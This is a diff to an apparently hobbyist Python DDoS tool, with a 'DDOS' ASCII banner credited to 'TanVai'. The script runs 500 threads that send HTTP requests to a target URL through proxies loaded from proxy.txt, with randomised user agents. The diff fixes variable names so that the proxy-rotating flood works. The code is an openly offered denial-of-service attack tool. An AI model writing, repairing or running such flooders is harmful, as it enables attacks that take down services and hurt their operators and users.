@@ -26,18 +26,18 @@ useragents = [
     
 class fucker(threading.Thread):
     
-    def __init__(self, url, number, requirements):
+    def __init__(self, url, number, proxy):
         threading.Thread.__init__(self)
         self.url = url
         self.num = number
         self.headers = { 'User-Agent' : random.choice(useragents) }
         self.Lock = threading.Lock()
-        self.proxy= requirements
+        self.proxy= proxy
 
     def request(self):
         data = None
-        proxy= urllib.request.requirementsHandler({'http': self.requirements})
-        opener = urllib.request.build_opener(requirements)
+        proxy= urllib.request.proxyHandler({'http': self.proxy})
+        opener = urllib.request.build_opener(proxy)
         urllib.request.install_opener(opener) 
         req = urllib.request.Request(self.url, data, self.headers)
         urllib.request.urlopen(req)
@@ -89,17 +89,16 @@ class MainLoop():
                      \033[1;32mTanVai\033[1;31m
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣿⣿⣿⣿⣿⣷⣷⣶⣿
 
-▓█████▄ ▓█████▄  ▒█████    ██████ 
-▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
-░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
-░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
-░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
- ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
- ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
- ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
-   ░       ░        ░ ░        ░  
- ░       ░                        
-
+            ▓█████▄ ▓█████▄  ▒█████    ██████ 
+            ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
+            ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
+            ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
+            ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
+            ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
+            ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
+            ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
+              ░       ░        ░ ░        ░  
+            ░       ░                        
 
 \033[1;36m                           
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -118,9 +117,9 @@ class MainLoop():
             pass
         try:
             file_proxy= str("proxy.txt")
-            in_file = open(file_requirements,"r")
+            in_file = open(file_proxy,"r")
         except:
-            in_file = open(file_requirements,"r")
+            in_file = open(file_proxy,"r")
         num_threads = str(500)
         if num_threads == "":
             num_threads = int(500)
@@ -139,4 +138,4 @@ if __name__ == '__main__':
         os.system("clear")
     else:
         ("cls")
-    MainLoop().home() 
+    MainLoop().home()
